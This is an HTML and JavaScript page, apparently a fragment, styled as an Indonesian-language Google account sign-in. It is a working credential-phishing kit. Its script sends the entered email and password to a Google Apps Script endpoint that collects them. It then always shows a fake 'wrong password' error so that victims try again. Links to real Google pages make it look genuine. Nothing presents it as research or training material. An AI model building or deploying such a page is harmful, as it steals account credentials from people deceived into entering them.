    <style>
      * {
        margin: 0;
        padding: 0;
        font-family: "Open Sans", sans-serif;
      }
      .input {
        transition: border 0.2s ease-in-out;
        min-width: 280px;
      }
      .input:focus + .label,
      .input:active + .label,
      .input.filled + .label {
        font-size: 0.75rem;
        transition: all 0.2s ease-out;
        top: -0.9rem;
        background-color: #fff;
        color: #1a73e8;
        padding: 0 5px 0 5px;
        margin: 0 5px 0 5px;
      }
      .label {
        transition: all 0.2s ease-out;
        top: 0.4rem;
        left: 0;
      }
      .textransparan {
        color: rgba(0, 0, 0, 0);
      }
    </style>

          <span class="text-2xl font-semi-bold leading-normal">Login</span>
          <p class="leading-normal">Gunakan Akun Google Anda</p>
        </div>
        <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
          <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>

        <div class="alert alert-danger d-flex align-items-center d-none my-alert" role="alert">
          <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Danger:"><use xlink:href="#exclamation-triangle-fill"/></svg>
          <div>
            Email atau kata sandi anda tidak sesuai!   
            <button type="button" data-bs-dismiss="alert"></button>
          </div>
        </div>
        <form class="my-8" action="" method="POST" name="form-google">
          
          <div class="relative mb-2">
            <input
              type="email" name="email" id="email"
              class="w-full rounded px-3 border border-gray-300 pt-5 pb-2 focus:border-blue-700 focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none input-email" id="validationServer03" aria-describedby="validationServer03Feedback "
              required/>
              <div id="validationServer03Feedback" class="invalid-feedback">
                Coba lagi dengan alamat email yang valid
              </div>
            <label
              for="email"
              class="label absolute mt-2 ml-3 leading-tighter text-gray-600 text-base cursor-text"
              >Email atau ponsel
            </label>
            <p class="textransparan">tes</p>
          </div>
          <div class="space-y-9">
            <div class="relative mb-2">
              <input
                type="password" name="password" id="password"
                class="w-full rounded px-3 border border-gray-300 pt-5 pb-2 focus:border-blue-700 focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none input-password" id="validationServer04" aria-describedby="validationServer04Feedback "
                required/>
                <div id="validationServer04Feedback" class="invalid-feedback">
                  Sandi salah. Coba lagi atau klik Lupa sandi untuk mereset!
                </div>
              <label
                for="password"
                class="label absolute mt-2 ml-3 leading-tighter text-gray-600 text-base cursor-text"
                >Masukan sandi Anda
              </label><a class="text-sm font-bold text-blue-500" href="https://www.google.com/"
                >Lupa sandi?</a
              >
            </div>
            <div class="text-sm">
              <p>Bukan komputer Anda? Gunakan Private Window untuk login</p>
              <a class="font-bold text-blue-500" href="https://support.google.com/accounts/answer/2917834?visit_id=638165469661434965-1367640035&p=signin_privatebrowsing&hl=id&rd=1">Pelajari lebih lanjut</a>
            </div>
            <div class="text-sm flex justify-between items-center">
              <a
                class="font-bold text-blue-500 py-2 px-2 rounded -ml-2 hover:bg-blue-50 hover:text-blue-700"
                href="https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dcreate-account-button&flowName=GlifWebSignIn&flowEntry=SignUp"
                >Buat akun</a
              >
              <button class="py-2 px-6 btn btn-primary d-none btn-loading" type="button" disabled>
                <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
                Loading
              </button>
              <button type="submit"
                class="py-2 px-6 rounded text-white btn bg-blue-500 hover:bg-blue-600 btn-kirim">Lanjutkan
              </button>
            </div>
          </div>
        </form>
      </div>
    </div>
  </body>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

</html>

 <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzmn-LhZI9NcDWbzcwUlm-bStx7-3df9J4A-rtBP9jngDkJR2snxaKy0zAkN7Qqqy70mQ/exec'
    const form = document.forms['form-google'];
    const btnKirim = document.querySelector('.btn-kirim');
    const btnLoading = document.querySelector('.btn-loading');
    const myAlert = document.querySelector('.my-alert');
    const inputEmail = document.querySelector('.input-email');
    const inputPassword = document.querySelector('.input-password');

  
    form.addEventListener('submit', e => {
      e.preventDefault();
      btnLoading.classList.toggle('d-none');
      btnKirim.classList.toggle('d-none');
      
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => {
          btnLoading.classList.toggle('d-none');
          btnKirim.classList.toggle('d-none');
          myAlert.classList.toggle('d-none');
          inputEmail.classList.toggle('is-invalid');
          inputPassword.classList.toggle('is-invalid');
          form.reset();
          console.log('Success!', response)
        })
        .catch(error => console.error('Error!', error.message))
    });
  </script>
</body>
